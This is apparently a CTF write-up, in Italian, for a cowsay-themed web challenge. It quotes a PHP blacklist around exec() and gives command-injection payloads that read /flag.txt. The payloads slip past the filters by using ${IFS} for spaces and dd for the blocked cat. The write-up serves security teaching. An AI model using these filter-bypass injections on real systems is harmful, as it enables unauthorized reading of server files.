## 🐮 TIMP – Terminale Inhackerabile della Mucca Parlante

**URL:** [http://timp.challs.olicyber.it](http://timp.challs.olicyber.it)
**Descrizione:**

> Il terminale fa parlare una mucca con `cowsay`, ma l'obiettivo nascosto è leggere la flag in `/flag.txt`.
> Ci sono diversi filtri anti-comando e anti-bypass, ma esistono più modi per aggirarli.

---

## 🔍 Analisi del codice PHP

Nel form web viene eseguito questo PHP:

```php
if(preg_match('/[#@%^&*_+\[\]:>?~\\\\]/', $cmd)){
    ...
}
elseif(strlen($cmd) > 70){
    ...
}
elseif (strpos($cmd, "cowsay") !== false) {
    ...
}
elseif(strpos($cmd, "sudo") !== false){
    ...
}
elseif(strpos($cmd, "echo") !== false){
    ...
}
elseif (strpos($cmd, "cat") !== false) {
    ...
}
elseif (strpos($cmd, " ") !== false){
    ...
}
elseif (strpos($cmd, "head") !== false || strpos($cmd, "tail") !== false || strpos($cmd, "od") !== false || strpos($cmd, "less") !== false || strpos($cmd, "head") !== false || strpos($cmd, "hexdump") !== false){
    ...
}
else{
    $result = exec($cmd);
}
```

### 🚫 Cosa blocca?

* **Caratteri speciali:** `#@%^&*_+[]:>?~\`
* **Comandi comuni:** `cat`, `echo`, `sudo`, `head`, `tail`, `less`, `od`, `hexdump`
* **Spazi normali (`" "`)**
* **Stringhe troppo lunghe (>70 char)**

---

## 🧠 Idea di exploit

Non possiamo usare `cat /flag.txt` perché:

* `"cat"` è bloccato
* gli **spazi** sono bloccati

Ma c’è un dettaglio: **la funzione `exec()` viene comunque eseguita se il comando non contiene parole vietate né spazi!**

---

## ✅ Bypass spazio: `${IFS}`

`${IFS}` è una variabile bash che rappresenta l’**Input Field Separator** (di default è lo spazio).
Quindi possiamo fare:

```bash
cat${IFS}/flag.txt
```

Ma `"cat"` è bloccato ⇒ usiamo un altro comando che può leggere i file: **`dd`**.

---

## 🚀 Uso di `dd`

`dd` permette di leggere blocchi di file:

```bash
dd if=/flag.txt bs=1 skip=0 count=10
```

* `if=`: file di input
* `bs=1`: un byte alla volta
* `skip`: da dove partire
* `count`: quanti byte leggere

⚠️ Ma dobbiamo usare `${IFS}` al posto degli spazi:

```bash
dd${IFS}if=/flag.txt${IFS}bs=1${IFS}skip=0${IFS}count=10
```

---

## 🪓 Spezzare la flag a blocchi da 10 caratteri

La flag è lunga \~50 caratteri. La leggiamo in **chunk da 10**:

```
dd${IFS}if=/flag.txt${IFS}bs=1${IFS}skip=0${IFS}count=10      → flag{xxxx
dd${IFS}if=/flag.txt${IFS}bs=1${IFS}skip=10${IFS}count=10     → xxxxxxxxxx
dd${IFS}if=/flag.txt${IFS}bs=1${IFS}skip=20${IFS}count=10     → xxxxxxxxxx
dd${IFS}if=/flag.txt${IFS}bs=1${IFS}skip=30${IFS}count=10     → xxxxxxxxxx
dd${IFS}if=/flag.txt${IFS}bs=1${IFS}skip=40${IFS}count=10     → xxxxxxxxxx}
```

---

## 🏁 Flag Finale

Unendo i pezzi:

```
flag{REDHACKTED}
```

---

## 📌 Conclusione

* **Filtri e limitazioni** bloccano i comandi classici.
* **Bypass** usando `${IFS}` al posto degli spazi.
* **Lettura alternativa** con `dd` invece di `cat`.
* Metodo preciso, stabile e replicabile su CTF simili.

